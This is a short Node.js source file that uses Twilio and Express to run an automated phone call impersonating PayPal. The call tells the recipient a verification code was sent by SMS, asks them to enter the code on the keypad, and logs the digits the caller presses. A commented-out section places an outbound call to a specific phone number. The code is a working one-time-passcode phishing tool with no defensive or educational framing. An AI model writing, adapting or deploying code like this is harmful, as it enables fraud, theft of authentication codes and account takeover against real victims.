const VoiceResponse = require('twilio').twiml.VoiceResponse;
const express = require('express');
const urlencoded = require('body-parser').urlencoded;

const app = express();

app.use(urlencoded({ extended: false }));

app.get('/voice', (request, response) => {
  const twiml = new VoiceResponse();

  const gather = twiml.gather({ numDigits: 8 });
  gather.say('This call is from Paypal dot com. \nWe have sent you a verification code SMS to this number. \nPress the number now to verify');

  twiml.redirect('/voice');

  response.type('text/xml');
  response.send(twiml.toString());
  if (request.body.Digits) {
      console.log(request.body.Digits)
  }
});

console.log('Twilio Client app HTTP server running at http://127.0.0.1:3000');
app.listen(80);

// client.calls.create({
//                     url: 'http://127.0.0.1:3000/voice',
//                     to: '+19855160774',
//                     from: '18623566410'
// })

// .then(call => console.log(call.sid))

// .done();